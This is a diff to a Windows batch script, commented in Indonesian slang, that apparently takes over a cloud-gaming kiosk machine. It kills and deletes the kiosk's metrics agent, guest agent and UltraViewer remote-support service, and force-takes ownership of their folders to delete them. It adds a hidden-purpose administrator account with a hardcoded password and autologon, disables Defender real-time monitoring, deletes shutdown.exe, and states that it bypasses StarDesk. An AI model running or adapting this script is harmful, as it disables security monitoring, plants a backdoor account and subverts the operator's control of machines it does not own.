@@ -11,6 +11,8 @@ REM --- 1. KILL PROCESS (GATEWAY, AGENT, & SUNSHINE DIAMIN AJA) ---
 echo [*] Matiin proses sampah...
 taskkill /f /im genstream-metrics.exe /t >nul 2>&1
 taskkill /f /im GenStreamKioskDemo.exe /t >nul 2>&1
+taskkill /f /im UltraViewer.exe /t >nul 2>&1
+taskkill /f /im UltraViewer_Service.exe /t >nul 2>&1
 taskkill /f /im nvcontainer.exe /t >nul 2>&1
 taskkill /f /im qemu-ga.exe /t >nul 2>&1
 taskkill /f /im qemu-system-x86_64.exe /t >nul 2>&1
@@ -18,11 +20,27 @@ taskkill /f /im GamingServices.exe /t >nul 2>&1
 taskkill /f /im GamingServicesNet.exe /t >nul 2>&1
 
 REM --- 2. HAPUS SERVICE ---
-echo [*] Hapus service GsMetricsExporter...
+echo [*] Hapus service GsMetricsExporter & UltraViewer...
 sc stop GsMetricsExporter >nul 2>&1
 sc delete GsMetricsExporter >nul 2>&1
+sc stop UltraViewer_Service >nul 2>&1
+sc delete UltraViewer_Service >nul 2>&1
 
-REM --- 3. USER SETUP ---
+REM --- 3. HAPUS FOLDER GENSTREAM KIOSK & ULTRAVIEWER ---
+echo [*] Musnahin folder GenStreamKiosk & UltraViewer...
+takeown /f "C:\GenStreamKiosk" /r /d y >nul 2>&1
+icacls "C:\GenStreamKiosk" /reset /t /c >nul 2>&1
+icacls "C:\GenStreamKiosk" /grant "Administrators:(OI)(CI)F" /t /c >nul 2>&1
+attrib -s -h -r "C:\GenStreamKiosk" /s /d >nul 2>&1
+rmdir /s /q "C:\GenStreamKiosk"
+
+takeown /f "C:\Program Files (x86)\UltraViewer" /r /d y >nul 2>&1
+icacls "C:\Program Files (x86)\UltraViewer" /reset /t /c >nul 2>&1
+icacls "C:\Program Files (x86)\UltraViewer" /grant "Administrators:(OI)(CI)F" /t /c >nul 2>&1
+attrib -s -h -r "C:\Program Files (x86)\UltraViewer" /s /d >nul 2>&1
+rmdir /s /q "C:\Program Files (x86)\UltraViewer"
+
+REM --- 4. USER SETUP ---
 echo [*] Bikin user & auto login...
 net user kontol kontolo /add >nul 2>&1
 net localgroup administrators kontol /add >nul 2>&1
@@ -37,7 +55,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultU
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "kontolo" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d "%COMPUTERNAME%" /f >nul 2>&1
 
-REM --- 4. LOCK SYSTEM & STARDESK ---
+REM --- 5. LOCK SYSTEM & STARDESK ---
 echo [*] Lock system & bypass StarDesk...
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
@@ -51,9 +69,12 @@ powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&
 del /f /q C:\Windows\System32\shutdown.exe >nul 2>&1
 del /f /q C:\Windows\SysWOW64\shutdown.exe >nul 2>&1
 
-REM --- 5. FIX TASKBAR WIN 11 (ALWAYS SHOW & FORCE REFRESH) ---
-echo [*] Fix Taskbar Win 11 biar muncul terus & Force Refresh UI...
-powershell -Command "$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3'; $v=(Get-ItemProperty -Path $p).Settings; $v[8]=2; Set-ItemProperty -Path $p -Name Settings -Value $v"
+REM --- 6. FIX TASKBAR WIN 11 (ALWAYS SHOW) ---
+echo [*] Fix Taskbar Win 11 biar muncul terus...
+powershell -Command "$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3'; $v=(Get-ItemProperty -Path $p).Settings; $v[8]=2; Set-ItemProperty -Path $p -Name Settings -Value $v" >nul 2>&1
+
+REM --- 7. RESTART EXPLORER (PALING TERAKHIR) ---
+echo [*] Restart Explorer...
 powershell -Command "Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1; Start-Process explorer"
 
 echo.
